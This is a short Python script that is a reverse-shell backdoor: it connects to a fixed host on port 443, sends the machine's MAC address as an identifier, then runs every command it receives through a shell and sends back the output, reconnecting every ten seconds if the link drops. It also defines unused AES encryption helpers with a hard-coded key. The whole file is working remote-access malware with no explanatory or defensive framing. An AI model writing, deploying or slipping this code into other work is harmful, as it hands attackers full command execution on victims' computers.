import threading
import subprocess as sp
import socket
import uuid
import base64
import time
from Crypto.Cipher import AES


counter = b"H"*16
key = b"H"*32

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message)


def payload():
    HOST = '127.0.0.1'
    PORT = 443
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        a=hex(uuid.getnode())
        a = bytes(a)
        a=base64.b64encode(a)
        s.sendall(a)
        while True:
            msg=s.recv(2048)
            c_m_d = sp.Popen(msg, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            s.send( c_m_d.stdout.read() ) # send back the result
            s.send( c_m_d.stderr.read() ) # send back the error -if any-, such as syntax error
    except socket.error as error:
        time.sleep(10)
        payload()
payload()
